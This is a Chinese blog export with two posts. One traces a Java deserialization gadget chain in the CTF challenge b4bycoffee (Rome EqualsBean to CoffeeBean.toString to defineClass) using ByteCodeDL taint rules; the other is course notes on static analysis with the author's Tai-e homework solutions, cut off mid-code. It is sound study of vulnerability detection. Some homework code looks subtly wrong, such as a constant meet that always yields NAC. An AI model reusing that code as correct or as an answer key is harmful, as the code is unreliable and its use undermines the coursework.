使用ByteCodeDL分析长城杯CTF b4bycoffee\n先分析一下源码\n\n这道题给了入口点 com.example.b4bycoffee.controller#order() 存在 AntObjectInputStream 重写的 readObject()\n\n这里可以看到在 AntObjectInputStream 的构造函数中构建了黑名单列表\n\n题目环境给了 Rome 依赖，并且有个 CoffeeBean类的 toString() 方法可以加载字节码。那么配合 Rome 的 EqualsBean类在HashMap put操作时会触发对 key 的 hashCode 操作，进一步调用 toString() 方法可以接上利用链\n\n「ByteCodeDL 自动化检索」\n\n入口函数：toString，hashCode，compareTo\nsource field\nsink defineclass\n规则如下：\n这里注意细节：\n\n污点源只设置了 field 字段可控\n入口函数因为性能原因也只设置了 com.example.b4bycoffee.model.CoffeeBean\n\n#define MAXSTEP 5#define CHAO 1#include &quot;logic/ptaint.dl&quot;#include &quot;logic/cha.dl&quot;.init ptaint = PTaint// 1. toString() -[*]-&gt; defineclass()// 2. // 定义 CHA 入口函数 EntryPoint(simplename, descriptor, class) :-\tsimplename = &quot;toString&quot;,\tdescriptor = &quot;()Ljava/lang/String;&quot;,\tSubClass(class, &quot;java.io.Serializable&quot;), \t// TODO: 不加会慢\tclass = &quot;com.example.b4bycoffee.model.CoffeeBean&quot;.// 定义 CHA 的 sinkSinkDesc(&quot;defineClass&quot;, &quot;java.lang.ClassLoader&quot;). // 将可到达 sink 的入口函数 作为污点分析的起点ptaint.Reachable(method) :-\tSinkReachable(method, _, _), \tEntryMethod(method)..output SinkReachable// 定义污点分析当中的 sinkptaint.SinkMethod(method, 1) :- \tMethodInfo(method, &quot;defineClass&quot;, _, class, _, _, _), \tSubEqClass(class, &quot;java.lang.ClassLoader&quot;).// 对反序列化的对象进行 mock this 指向虚拟创建的对象NormalHeap(heap, class),ptaint.TaintHeap(insn, heap),ptaint.VarPointsTo(heap, this) :-    EntryPoint(simplename, descriptor, class),    Dispatch(simplename, descriptor, class, method),    ThisVar(method, this),    insn = cat(&quot;Mock&quot;, class),    heap = cat(&quot;NewTainted::&quot;, insn).// ex. CoffeeBean 中 ClassByte 字段可控，因此 load field 将使得左边变量同样可控// 如果对象是污点，反序列化的时候认为其 field 都可控，那么 load field 也是污点NormalHeap(newHeap, class),ptaint.TaintHeap(insn, newHeap),ptaint.TransferTaint(heap, newHeap),ptaint.VarPointsTo(newHeap, var) :-    ptaint.Reachable(inMethod),    // var = base.field    LoadInstanceField(insn, _, var, base, field, inMethod),    FieldInfo(field, _, _, type),    // 所有子类，这里可能是保证 sound ?    SubEqClass(class, type),    // base 为污点对象    ptaint.VarPointsTo(heap, base),    ptaint.TaintHeap(_, heap),    // 通过 load field 也会产生污点对象    newHeap = cat(&quot;TransferTaint::Mock::Load&quot;, insn)..decl TaintVar(var:Var)// 可控变量TaintVar(var) :-    ptaint.VarPointsTo(head, var),     ptaint.TaintHeap(_, heap). .decl SinkTaintVar(var:Var, heap:Heap)// 污点实际出现在 sink 的第 n 个参数上SinkTaintVar(var, heap) :-    ptaint.CallGraph(insn, caller, method),     ptaint.SinkMethod(method, n),     VirtualMethodInvocation(insn, _, _, _, caller),     ActualParam(n, insn, var),     ptaint.VarPointsTo(heap, var),     ptaint.TaintHeap(_, heap).  .output TaintVar.output SinkTaintVar.output ptaint.TaintHeap.output ptaint.TransferTaint.output ptaint.VarPointsTo.output ptaint.SinkMethod.output ptaint.CallGraph\n运行生成 facts 并启动分析引擎\njava -jar soot-fact-generator.jar -i b4bycoffee-0.0.1-SNAPSHOT.jar --full -l /Library/Java/JavaVirtualMachines/jdk1.8.0_121.jdk/Contents/Home/jre/lib/rt.jar -d ../example/changchengCTF --allow-phantom --generate-jimplesouffle -F changchengCTF/ -D . exp.dl\n输出污点变量如下：可以看到污点数据从 field 传到了 stack6/8 以及最终的 sink 函数上\n\n\n\n从 Jimple 文件中验证确实从 base.field 当中通过 load 传递了污点\n\n从 SinkTaintVar.csv 中可以大致看出污点传播路径\nCoffeeBean#toString() -&gt; \tread-field-ClassByte -&gt;\t\tdefineClass()\n\n困难之处：\n\n污点转换函数如何构造？\n这里如果不限制入口函数位于 com.example.b4bycoffee.model.CoffeeBean 类中，即扩大入口函数量，性能开销如何优化？\n污点源如何构造，这里只写了通过 this 以及 load field 来构造污点 source，实际可能还有从参数传递、或者一些函数如 readObject() 作为污点 source\n似乎还是不支持对 springboot 依赖的分析？\n\nTODO：https://github.com/BytecodeDL/ByteCodeDL/discussions/10\n&gt;&gt;\n\n大致操作：\n\n先标记出来污点源（对于一些带有注解的函数，还需要添加注解支持，soot-generator 是可以生成的）\n构建污点传递规则\n\n\n\n9. GPT-4\n\n参考链接[1] https://y4er.com/posts/bytecodedl/#ptaptaint-analysis\n[2] https://tttang.com/archive/1541/#toc_0x02-example-2\n[3] https://ranger-nju.gitbook.io/static-program-analysis-book/ch3/pointer-analysis/03-02-pointer2-analysis-spa#handling-of-new-and-assign\n[4] https://github.com/BytecodeDL/ByteCodeDL/discussions\n[5] https://y4er.com/posts/bytecodedl/#ptaptaint-analysis\n[6] https://yanniss.github.io/ptaint-oopsla17-prelim.pdf\n[7] https://tttang.com/archive/1510/\n","tags":["Java安全","静态分析"]},{"title":"南大《软件分析》课程笔记","url":"/2023/01/04/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/","content":"写在前面准备系统的看一下南大《软件分析》课程，系统的入门一下静态分析，好为之后的自动化漏洞挖掘搭好基础，加油坚持\n\n01-Introduction静态分析：在编译时刻去检验程序存在的相关问题\n可以解决的问题\n\n程序的可靠性、安全性\n编译优化（后端）\n帮助程序的理解 -&gt; IDE提示\n\n\n含义：想要在程序运行前分析程序，去了解其中的特征和和是否符合一些性质\n\n\n\n不存在方法可以准确的判断程序的性质。换言之，任何递归可枚举语言（现在正常的编程语言）的non-trivial性质都无法判断。\n\n\n\nnon-trivial性质：有趣的性质，也就是和程序运行时某些行为相关的\n\n\n完美的静态分析\n\nSound 类似过拟合（包含Truth的情况\nTruth 实际真实的特征（例如有10个空指针异常\nComplete 存在的肯定在Truth里头\n\n\n\nUseful静态分析\n\n妥协 sound 会产生漏报\n妥协 complete 会产生误报（实际绝大多数方法都是这样）\n\nSoundness的必要性\nSoundess 对编译优化和程序验证是必不可少的，要考虑所有情况\n\n\n  确保或靠近soundness作为前提，在精度和速度之间做有效的平衡\n\n\n需要什么样的技术\n抽象 + Over-approximation(近似)\n\n抽象\n将每一个具体的域值映射到抽象域（分析关注的符号值）中\n\n\n近似 Transfer Function\n针对每一个程序语句基于抽象值作转换规则\n规则的定义：\n\n基于分析的目标，以及程序语句分析的语义\n\n\n\n控制流图\n汇聚点要针对语义进行合并（因为不可能枚举所有路径）\n\n\n\n\n\n\n02-Intermediate Representation\n编译器和静态分析器的关系\n首先是编译器，先经过词法分析生成记号流（用到正则表达式做规则），进入解析器进行语法分析（上下文无关文法），生成抽象语法树。进而进行语义分析（只能做简单的检查，例如类型检查）。如果还要做代码优化，就需要通过转换器产生IR（通常是三地址码表示），这里也就是静态分析的部分的应用，最终生成机器码交给环境去执行。\n\n\nAST vs. IR\n\nIR特点在于与高级程序语言的无关性，不依赖与语言的特性；并且不存在冗余的信息；包含控制流的信息\n\n\nIR\n\n三地址码 3AC\n定义：在指令的右侧最多一个操作符\n常见指令的3AC\n\n\nSoot\n\nJVM 四种指令\n\n\nMethod Signature：一般包含方法声明所在类，返回值类型（或void），方法名字，参数类型\n\n\n\nclinit： 类的静态的初始化函数。在引用一个变量的时候，会把这个变量加载进来\n\n\n\n\n\n\nSSA （另一种IR里面的转换格式）\n给每一个定义新的name，每个变量都有一个精确的定义。专门定义一个函数来作为变量的选择，并作为新的变量名\n\n\n控制流分析 CFG\n给定输入是三字节码\n\n结点：Basic Blocks\n特征定义：满足下列性质的最大的连续三地址码指令\n\n如何建立呢？\n一个jump的目标的指令应该作为一个BB的入口（反证法就会有两个入口）\n一条指令紧跟着jump指令后头，它应该也作为BB的入口（反证法就会有两个出口）\n\n\n怎样在BB的基础上添加边？\n对于有条件跳转的情况，下一条紧跟的BB也要练；无条件的不需要\n\n直接将跳转的指令标签替换成所在的BB即可，因为两者的含量信息是一致的\n\n进而产生前趋和后继的概念，之后还要加两个特殊结点（方便程序设计时初始化），可以有多个入边和出边\n\n\n\n\n\n03-Data Flow Analysis I\nData Flow Analysis \nData是如何在CFG上进行流动的？\n对于绝大多数的静态分析，我们都尽可能以sound为标准\n\n但是对某些特定分析，需要达到must analysis\n\n\n\n因此统一称作不同标准对应的safe approximation\n\n\nInput and Outout States\n^代表meet汇聚符号\n\n我们给每个点都关联一个值。该值时程序状态的抽象集合（我们关注的）\n抽象指的是定义能否到达该点的抽象表示（位向量）\n\n值域domain\n\n数据流分析的定义\n不停的运用transfer functions 和 控制流在IN 和OUT上，直至找到一个符合safe-approximations标准的解决方案\n\n\nTransfer functions ‘s constraints\n\n前向分析\n\n\n反向分析\n\n\n\n\ncontrol flow’s constraints\n\nBB块内，每一个statements 顺序执行\n\n\nBB之间\n首先B的transfer function 由每一个内部的statements迭代调用各自的transfer function构成规则；\n\n反向操作\n\n\n\n\nReaching Definitions Analysis\n处理的程序不涉及方法调用以及别名\n简单来说就是定义v的地方p，到q可以有条路径，但不能有v的新定义\n\n这里应该是以may-analysis为标准，实际运行中可能会有多个路径但只有一条可达。所以我们需要考虑到全部的可达性。\n\n如何做抽象和约束规则\n抽象\n我们把定义值抽象成比特位的形式，从左数第i位对应的就是Di的定义，0代表该点定义不可达\n\n约束规则\n针对每一个语句块而言，生成新的定义，同时kill掉其他定义v的地方；但是对于其他输入的定义x 和 y 不受影响\n\n符号形式表示\nBB\n转移函数：生成语句块中生成的定义，同时kill掉之后二次定义（已生成定义）的地方\n\n\n控制流： may-analysis -&gt; over approximation\n\n\n算法\n按照语义来理解，初始置OUT[entry]为空，也就是说当前并没有定义流到entry的OUT处；\n这个算法针对所有数据流分析模型都是一样的，所以初始化值entry不一定为空；\nBB初始化为空是针对may analysis，对于must analysis一般是top;\n循环体中就是针对BB不停的做规则定义的约束；\n循环如何结束？\n如果IN不变，则输出也不会变化 kill是个常量（statememts不会变）\n\nexample\n\n迭代为什么会停？有没有可能不会停？\n关键点：transfer function\n\n\nOUT[S] = gen_S \\ U\\ (IN[S] -kill_S)1不会变成0，只要定义进入到OUT中，就不会在变回0（该kill的在transfer function时已经被kill掉）；但是OUT增长会有限，也就是存在一次迭代OUT不会再变化；而OUT不会变的话，在transfer function中，根据\n\nIN[B]=U_{P predecessor of B}\\ OUT[P]可知，IN也不会变。从而再下一次迭代中同理OUT也不会再变，也就意味着程序状态达到了一个不动点，（和程序的单调性有关）作为程序的分析结果\n\n\n\n\n\n04-Data Flow Analysis II\nLive Variable Analysis\n\n\n\n从v到被使用的地方存在这么一条路径，同时v在这中途没有被重定义，我们就说v在program p点是live的\n\n\nData怎么抽象？\nData是什么？程序中所有的变量\n同样可以用比特位来表示\n\n如何设计transfer function? backward的设计方式比较方便已知OUT[B]求IN[B]？\n\n通过一个应用场景来说明，可以看到如何判断是否是live的其实就是看OUT[B]中有无使用v，或者在被redefined之前use了v\n\n\nIN[B]=use_B\\ U\\ (OUT[B]-def_B)def指的是v被redefined的情况，也就是减去redefined的情况，但也有可能是live的。如情况4和6，在redefined之前被use了，就要把他们加回来\n\n算法\n一般情况下，may analysis的初始化为空；must analysis的初始化为all.循环中不停迭代，直至所有的IN都不再变化\n\nexp\n\n\n\n同理，kill和g都是固定的，因此OUT不变，所以IN也不会变\n\nAvailable Expression Analysis (must analysis)\n从entry开始，到p的所有path都要经过执行x op y的值，各自path的表达式x op y之后，没有再出现重定义\n\n\n数据抽象 针对的是expression\n利用比特位来表示，0代表不available，1相反\n\ntransfer function\n针对 must analysis，gen部分加入新生成的expression，同时kill部分去掉被重定义的变量对应的表达式\n\n\nOUT[B]=gen_B\\ U\\ (IN[B]-kill_B)因为所有的path都得有表达式 x op y，不能仅有一条有\n\n可能会有漏报，但是也可以认为是safe approximation的\n\n\n算法\n这里有个细节就是初始化时OUT[B]全为1。在循环当中迭代运行，直至没有OUT变化\n\n\n\n\n分析对比\n\n\n\n\nHomeWork1 活跃变量分析和迭代求解器 https://tai-e.pascal-lab.net/pa1.html#_2-%E5%AE%9E%E7%8E%B0%E6%B4%BB%E8%B7%83%E5%8F%98%E9%87%8F%E5%88%86%E6%9E%90\n\n前置知识\n\n用到了Java的一些特性\n\nOptional特性：isPresent() 和 get()的使用\n\n\n泛型特性\n\n\npascal.taie.analysis.dataflow.analysis.DataflowAnalysis\n五个关键API：分析方向、边界条件、初始条件、meet操作、transfer函数\npascal.taie.ir.exp.Exp\n这是 Tai-e 的 IR 中的一个关键接口，用于表示程序中的所有表达式。其中有很多继承类，本次作业只需关注Var类\npascal.taie.ir.stmt.Stmt\n为了实现活跃变量分析，你需要获得某条语句中定义或使用的所有表达式中的变量\npascal.taie.analysis.dataflow.fact.SetFact&lt;Var&gt;\n它提供了各种集合操作，如添加、删除元素，取交集、并集等\npascal.taie.analysis.dataflow.analysis.LiveVariableAnalysis\n实现 DataflowAnalysis 的接口来定义具体的活跃变量分析\n\n函数实现\n\npublic SetFact&lt;Var&gt; newBoundaryFact(CFG&lt;Stmt&gt; cfg)\n\nnew fact in boundary conditions, i.e., the fact forentry (exit) node in forward (backward) analysis\n\n在这里想了好久，后来再看注释原来就是返回一个fact用于exit结点的。所有的实际操作应该是在solver中实现\n\npublic SetFact&lt;Var&gt; newInitialFact()\n\nnew initial fact for non-boundary nodes\n\n同理也是返回fact\n\nvoid meetInto(Fact fact, Fact target)\n\nMeets a fact into another (target) fact. This function will be used to handle control-flow confluences.\n\n这里对应算法当中并集处理IN到OUT当中，在实现上，实验文档说明了避免通过生成一个新的fact来实现合并的功能，所以是利用对每一个IN的fact集迭代合并到OUT当中，来优化程序\n\n所以我们这里也应该注意一下union和unionWith方法的区别\n\nublic boolean transferNode(Stmt stmt, SetFact&lt;Var&gt; in, SetFact&lt;Var&gt; out)\n\nThe function transfers data-flow from in (out) fact to out (in) fact. for forward (backward) analysis.@return true if the transfer changed the out (in) fact, otherwise false.\n\n实验中为了简化，将BB视为了一条条statements\n依照算法\n\nIN[B] = use_B\\ U\\ (OUT[B]-def_B);实现上的思路就是，复制OUT集合中的fact到新集合，然后针对其中的定义变量作生成和删改操作，最后与输入参数中的IN集合作比对看是否出现变化\n\n针对fact集的复制，可以利用进行深拷贝\n\n\nstmt.getUses() 返回的是一个 List&lt;RValue&gt;。在 RValue 下，有立即数也有变量。怎么判断一个 RValue 变量是不是指向了一个 Var 对象呢？Java 里的解决方法就是 instanceof 关键字。\n\n依然是那个问题，SetFact&lt;Var&gt; 储存的是 Var，如何把 RValue use 内的对象放进去呢？方法就是强制类型转换 (Var) use;\n\n\npublic class LiveVariableAnalysis extends        AbstractDataflowAnalysis&lt;Stmt, SetFact&lt;Var&gt;&gt; &#123;    public static final String ID = &quot;livevar&quot;;    public LiveVariableAnalysis(AnalysisConfig config) &#123;        super(config);    &#125;    @Override    public boolean isForward() &#123;        return false;    &#125;    @Override    public SetFact&lt;Var&gt; newBoundaryFact(CFG&lt;Stmt&gt; cfg) &#123;        // 边界结点对应exit 这里意思就是返回一个 fact        return new SetFact&lt;Var&gt;();    &#125;    @Override    public SetFact&lt;Var&gt; newInitialFact() &#123;        // 返回非边界结点的fact        return new SetFact&lt;Var&gt;();    &#125;    @Override    public void meetInto(SetFact&lt;Var&gt; fact, SetFact&lt;Var&gt; target) &#123;        // 这里做并集        target.union(fact);    &#125;    @Override    public boolean transferNode(Stmt stmt, SetFact&lt;Var&gt; in, SetFact&lt;Var&gt; out) &#123;        // 先作复制OUT集中的内容        SetFact&lt;Var&gt; newInFact = new SetFact&lt;Var&gt;();        newInFact.set(out);        // 运用算法修改 先删除        Optional&lt;LValue&gt; leftValue = stmt.getDef();        if(leftValue.isPresent()) &#123;            LValue lValue = leftValue.get();            if (lValue instanceof Var) &#123;                newInFact.remove((Var)lValue);            &#125;        &#125;        // 再添加新定义的变量        List&lt;RValue&gt; rightValues = stmt.getUses();        for (RValue rightValue : rightValues) &#123;            if(rightValue instanceof Var) &#123;                newInFact.add((Var)rightValue);            &#125;        &#125;        // 最后判断修改的In和上一轮的IN是否相同        if(!newInFact.equals(in)) &#123;            // 记得将修改内容赋给 输入的 in            in.set(newInFact);            return true;        &#125;        return false;    &#125;&#125;\n\n\n\n\n\n\n  实现迭代求解器\n\n前置知识\npascal.taie.analysis.dataflow.fact.DataflowResult\n该类对象用于维护数据流分析的 CFG 中的 fact。你可以通过它的 API 获取、设置 CFG 节点的 IN facts 和 OUT facts。\npascal.taie.analysis.graph.cfg.CFG\n表示程序中方法的控制流图，可迭代\n\n实现\n方法1：protected void initializeBackward(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result) \n这里对应算法核心的迭代之前的初始化操作\n细节\nSolver 是一个抽象的分析框架，因此 Node 和 Fact 都是未确定的，不能做 new Node() 这样的操作。这里实际上要利用前面分析器的接口方法，还是多看注释源码\n为了实现上面所说的 meet 策略，你需要在初始化阶段给每条语句的 OUT[S] 赋上和 IN[S] 一样的初值\nprotected void initializeBackward(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result) &#123;        // 初始化 OUT[exit] = 空集        Node exit = cfg.getExit();        result.setOutFact(exit, analysis.newBoundaryFact(cfg));        result.setInFact(exit, analysis.newBoundaryFact(cfg));        for (Node node : cfg) &#123;            // 不对exit重复初始化            if (!cfg.isExit(node)) &#123;                result.setInFact(node, analysis.newInitialFact());                result.setOutFact(node, analysis.newInitialFact());            &#125;        &#125;    &#125;\n方法2：IterativeSolver.doSolveBackward(CFG,DataflowResult)\n\n\n05-Data Flow Analysis - Foundations I\n另一个角度理解迭代算法\n每次迭代更新结点中的OUT值\n\n每次迭代可以视为一次动作F，也就是包含了transfer function和CFG，对应$V^k$到$V^k$的映射\n\n停止条件：最后一次迭代的k元组值与上一个最后迭代值相等\n\n图示表示：\n初始化元组各项为bottom，第i+1次迭代和第i次迭代结果相同\n\n关注最后两个式子\n\n由此引出X不动点的定义\n\n那么算法是否能保证得到一个不动点嘛？或者说是否一定能为数据流分析给出一个solution\n\n相关数学概念\n\nPartial Order\n偏序集满足的性质\n\n偏序的意义：集合中两个元素可以不满足偏序关系\n\n\nUpper and Lower Bounds 上下界\n\n最小上界和最大下界的概念\n\n最小上界和最大下界的另一种表示，当S值包含两个元素时\n\n相关性质：\n\n证明：利用了偏序的反对称性\n\n\n\n\nLattice\n\n\n定义Semilattice\n最小上界和最大下界只存在其一\n\n定义Complete Lattice，不再是针对两个元素的子集，而是任意的子集\n\n由此引出bottom和top的含义。\n\n只有你的lattice是有穷的，则它一定是complete lattice；反之不一定成立\nProduct Lattice\n\n最小上界上最下下界\n\n两个性质\n\n\n用Lattice来表达数据流分析框架\n\nexp:s1 和 s3的join操作，实际上右面的Lattice从下往上升（may analysis）\n\n\n\n\nLattice函数单调性（回答data flow analysis是否能到不动点）\nLattice上定义函数单调性及不动点定理\n针对不动点定理，前提是complete lattice，所以需要加一个条件即L是有限的\n\n这里给出了最小不动点和最大不动点的方法，证明如下（最小不动点）\n充分利用bottom的定义和单调性定义、有限性\n这里也就是说明了上升链有限，最终能达到不动点\n\n接下来证明得到的一定是最小不动点\n利用数学归纳法\n\n得到的最小不动点一定是唯一的最大不动点的证明同理\n\n有Lattice上的函数不动点定理引申到迭代算法上是否也满足不动点的性质？换句话说，两者怎么关联上？\n\n\n06 - Data Flow Analysis - Foundation\n迭代算法与固定点定理相结合\n针对第二个已知条件：L有限\n在一个迭代算法中每一个OUT的值域实际上就是对应一个Lattice，整个就构成一个product lattice\n\n针对第一个已知条件：函数f满足单调性\n\n大写的F包含两部分，每个结点施加transfer function；在控制流图中针对汇聚点采用join或meet方法合并。那么F是否是单调的？\n首先对于第一个transfer function我们已经在迭代算法中知道了当kill固定时和gen固定时，OUT/IN不变，那么IN/OUT也不会变，也就是说它是只增不减的，因此是单调的\n\n对于join/meet，我们以join为例，证明如下\n利用最小上界的定义\n\n\n迭代算法什么时候能达到不动点，复杂度问题\nlattice的高度\n\n什么时候能达到不动点，也就是求最大迭代次数\n考虑最坏情况，每一次迭代，只有一个结点的一个值变化\n\n如果lattice的高度为h，且CFG中的结点数为k，则最大迭代次数为\n\ni=h*k\nMay and Must Analysis \n对于May analysis来讲，bottom就意味着unsafe result，（没有定义可以到达，也就是所有定义都已经初始化过）；而top意味着所有的定义都可达，也就是说肯定能保证正确但是无用。\n\n从bottom到top，自下而上需要一个truth点作为边界，如何辨别是否safe，或者说到达不动点取决于算法的safe approximation的策略\n自下而上，不动点越往上精度越差，因此达到最小不动点是最好的\n\n而对于must analysis，有一个误报可能都会导致程序分析的错误\n所以其是从top往下走，直至最大不动点将会达到精度最高的safe点\n\nPath Function 精度问题\n\nMOP 枚举所有path，应用Path Function\n\n当然这只是概念上的一种形式，实际上枚举起来非常困难\n那么迭代算法结果和MOP的关系？\n\n实际上就是join的位置不太一样\n\n证明：\n\n结果在lattice上满足偏序关系，MOP是更准的。\n特殊情况下，如果F满足分配律\n\n\nConstant Propagation （函数不满足分配律）\nmust analysis 满足前向传播\n\nLattice下\n\nDomain of the values V \n特殊点在初始化时v的值是undefined（虽然初始化时从top开始）\n\nMeet Operator\n特别地，这里不关注未初始化变量的问题，也就是只要有path到达，就是已初始化变量\n\n\n\ntransfer function\n\n在val(x)最后一种情况，如果一个常量+undefined值，则transfer function将不满足单调性\n它的非分配律特性\n当两边均是NAC时，join后就是NAC\n\n\nWorklist Algorithm(迭代算法的优化)\n核心：只需遍历有变化的地方施加transfer function，而非整体再迭代一遍\n只计算IN变的，OUT才有可能会变；因此当OUT变时只需关注它的所有后继BB即可\n\n\n\n实验2 常量传播和 Worklist 求解器需要了解的类\npascal.taie.ir.IR\nIR 的核心数据结构。它的每个实例储存了一个 Java 方法的各种信息，例如变量、参数、语句等等\npascal.taie.ir.exp.Exp类型接口\n\nVar第一个实验我们已经用过\npascal.taie.ir.exp.IntLiteral 整数字面量\npascal.taie.ir.exp.BinaryExp 二元表达式\n这个类代表程序中的二元表达式。这个类的各个子类对应了表 1 中的不同种类的二元表达式，并且每个子类中都有一个内部枚举类型用于表示该类支持的运算符。\n\n作者提到了二元表达式的操作数均设计成立变量的形式，也就是说\n\n\n\npascal.taie.ir.stmt.DefinitionStmt\n这是 Stmt 的一个子类。它表示了程序中所有的赋值语句\npascal.taie.analysis.dataflow.analysis.DataflowAnalysis\n这是具体数据流分析算法需要实现的接口(实现类为pascal.taie.analysis.dataflow.analysis.constprop.ConstantPropagation)，之后会被求解器调用。本次实验关注前5个API\npascal.taie.analysis.dataflow.analysis.constprop.Value\n这个类表示了常量分析中格上的抽象值\n用下列的静态方法获取格上抽象值（即该类的实例）\n\nValue getNAC(): 返回 NAC\nValue getUndef(): 返回 UNDEF\nValue makeConstant(int): 返回给定整数在格上对应的抽象值\n\npascal.taie.analysis.dataflow.analysis.constprop.CPFact\n这个类表示常量传播中的 data facts，即一个从变量（Var）到格上抽象值（Value）的映射。该类提供了各种 map 相关的操作，例如键值对的查询、更新等等\n实现常量传播\nAPI I : newBoundaryFact()\n在实现 newBoundaryFact() 的时候，你要小心地处理每个会被分析的方法的参数。具体来说，你要将它们的值初始化为 NAC，为了满足must analysis的top 符合safe approximation.同时这里还涉及到需要考虑方法参数类型是否在本实验的范围内，对于不在范围的直接忽略即可。\n这里在实现时就是先从图里取出所有的方法，然后获取IR语义信息中的参数进行初始化\npublic CPFact newBoundaryFact(CFG&lt;Stmt&gt; cfg) &#123;        // 针对方法中的每一个参数都要考虑，并且需要考虑参数类型是否在本实验范围        CPFact cpFact = new CPFact();        for (Var var : cfg.getMethod().getIR().getParams()) &#123;            if (canHoldInt(var)) &#123;                cpFact.update(var, Value.getNAC());            &#125;        &#125;        return cpFact;    &#125;\nAPI II : newInitialFact()\n这里没啥好说的，就是正常返回一个空fact\nAPI III : meetInto()\n原理参照：\n\n这里利用到了一个辅助函数Value meetValue(Value,Value)对应的是格上的meet操作，我们先实现格上的\n这里需要注意一点的就是要返回常数的话需要先调用一个Value的makeConstant方法\npublic Value meetValue(Value v1, Value v2) &#123;    if(v1.isNAC() || v2.isNAC())&#123;        return Value.getNAC();    &#125; else if (v1.isUndef()) &#123;        if (v2.isConstant()) &#123;            return Value.makeConstant(v2.getConstant());        &#125;else if (v2.isUndef()) &#123;            return Value.getUndef();        &#125;    &#125; else if (v2.isUndef()) &#123;        if (v1.isConstant()) &#123;            return Value.makeConstant(v1.getConstant());        &#125;else if(v1.isUndef()) &#123;            return Value.getUndef();        &#125;    &#125;else if (v1.isConstant() &amp;&amp; v2.isConstant()) &#123;        return Value.getNAC();    &#125;    System.out.println(&quot;meetValue error&quot;);    return null;&#125;\n然后就是实现meetInto()\n这里也就是需要遍历fact map中的变量将其依次合并到target map上（meet时利用格上的合并方法）\npublic void meetInto(CPFact fact, CPFact target) &#123;    // TODO - finish me    fact.forEach((key, value)-&gt;&#123;        target.update(key, meetValue(value, target.get(key)));    &#125;);&#125;\nAPI IV : transferNode()\n首先先实现Value evaluate(Exp,CPFact)\n这个方法会计算表达式（Exp）的值（Value）。当然，此处的值是格上的抽象值。\n原理参考\n\n也就是我们需要按照不同的表达式类型来作不同处理，对于非赋值型语句，采用直接复制的操作\npublic static Value evaluate(Exp exp, CPFact in) &#123;       // TODO - finish me       if (exp instanceof Var) &#123;           Var temExp = (Var)exp;           if (canHoldInt(temExp)) &#123;               return in.get(temExp);           &#125;       &#125; else if(exp instanceof IntLiteral) &#123;           IntLiteral temExp = (IntLiteral) exp;           return Value.makeConstant(temExp.getValue());       &#125; else if (exp instanceof BinaryExp) &#123;           // 进一步判断子类           if(exp instanceof ArithmeticExp) &#123;               ArithmeticExp temExp = (ArithmeticExp) exp;               Var operand1 = temExp.getOperand1();               Var operand2 = temExp.getOperand2();               if (canHoldInt(operand1) &amp;&amp; canHoldInt(operand2)) &#123;                   Value operandValue1 = in.get(operand1);                   Value operandValue2 = in.get(operand2);                   // exp1 均为常数                   if (operandValue1.isConstant() &amp;&amp; operandValue2.isConstant()) &#123;                       // + - * / %                       ArithmeticExp.Op operator = temExp.getOperator();                       if (ArithmeticExp.Op.ADD == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() + operandValue2.getConstant());                       &#125;else if(ArithmeticExp.Op.SUB == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() - operandValue2.getConstant());                       &#125;else if(ArithmeticExp.Op.MUL == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() * operandValue2.getConstant());                       &#125;else if(ArithmeticExp.Op.DIV == operator) &#123;                           // 考虑除0                           if (operandValue2.getConstant() == 0) &#123;                               return Value.getUndef();                           &#125;else &#123;                               return Value.makeConstant(operandValue1.getConstant() / operandValue2.getConstant());                           &#125;                       &#125;else if (ArithmeticExp.Op.REM == operator) &#123;                           if (operandValue2.getConstant() == 0) &#123;                               return Value.getUndef();                           &#125;else &#123;                               return Value.makeConstant(operandValue1.getConstant() % operandValue2.getConstant());                           &#125;                       &#125;                       // NAC情况                   &#125;else if(operandValue1.isNAC() || operandValue2.isNAC()) &#123;                       // 这种情况仍然需要考虑 NAC/0的情况是UDF                       if (operandValue1.isNAC() &amp;&amp; operandValue2.isConstant() &amp;&amp; operandValue2.getConstant()==0) &#123;                           ArithmeticExp.Op operator = temExp.getOperator();                           if (ArithmeticExp.Op.DIV == operator || ArithmeticExp.Op.REM == operator) &#123;                               return Value.getUndef();                           &#125;                       &#125;                       return Value.getNAC();                   &#125;else &#123;                       // otherwise return Undef                       return Value.getUndef();                   &#125;               &#125;           &#125;else if(exp instanceof ConditionExp) &#123;               // == != &lt; &gt; &lt;= &gt;=               // 返回值由 01 表示               ConditionExp conditionExp = (ConditionExp) exp;               Var operand1 = conditionExp.getOperand1();               Var operand2 = conditionExp.getOperand2();               if (canHoldInt(operand1) &amp;&amp; canHoldInt(operand2)) &#123;                   Value operandValue1 = in.get(operand1);                   Value operandValue2 = in.get(operand2);                   // constant                   if (operandValue1.isConstant() &amp;&amp; operandValue2.isConstant()) &#123;                       ConditionExp.Op operator = conditionExp.getOperator();                       if (ConditionExp.Op.EQ == operator) &#123;                           if (operandValue1.getConstant() == operandValue2.getConstant()) &#123;                               return Value.makeConstant(1);                           &#125;else &#123;                               return Value.makeConstant(0);                           &#125;                       &#125;else if (ConditionExp.Op.GE == operator) &#123;                           if (operandValue1.getConstant() &gt;= operandValue2.getConstant()) &#123;                               return Value.makeConstant(1);                           &#125;else &#123;                               return Value.makeConstant(0);                           &#125;                       &#125; else if (ConditionExp.Op.NE == operator) &#123;                           if (operandValue1.getConstant() != operandValue2.getConstant()) &#123;                               return Value.makeConstant(1);                           &#125;else &#123;                               return Value.makeConstant(0);                           &#125;                       &#125; else if (ConditionExp.Op.LT == operator) &#123;                           if (operandValue1.getConstant() &lt; operandValue2.getConstant()) &#123;                               return Value.makeConstant(1);                           &#125;else &#123;                               return Value.makeConstant(0);                           &#125;                       &#125; else if (ConditionExp.Op.GT == operator) &#123;                           if (operandValue1.getConstant() &gt; operandValue2.getConstant()) &#123;                               return Value.makeConstant(1);                           &#125;else &#123;                               return Value.makeConstant(0);                           &#125;                       &#125; else if (ConditionExp.Op.LE == operator) &#123;                           if (operandValue1.getConstant() &lt;= operandValue2.getConstant()) &#123;                               return Value.makeConstant(1);                           &#125;else &#123;                               return Value.makeConstant(0);                           &#125;                       &#125;                       // NAC                   &#125; else if(operandValue1.isNAC() || operandValue2.isNAC()) &#123;                       return Value.getNAC();                   &#125; else &#123;                       return Value.getUndef();                   &#125;               &#125;           &#125; else if (exp instanceof ShiftExp) &#123;               ShiftExp shiftExp = (ShiftExp) exp;               Var operand1 = 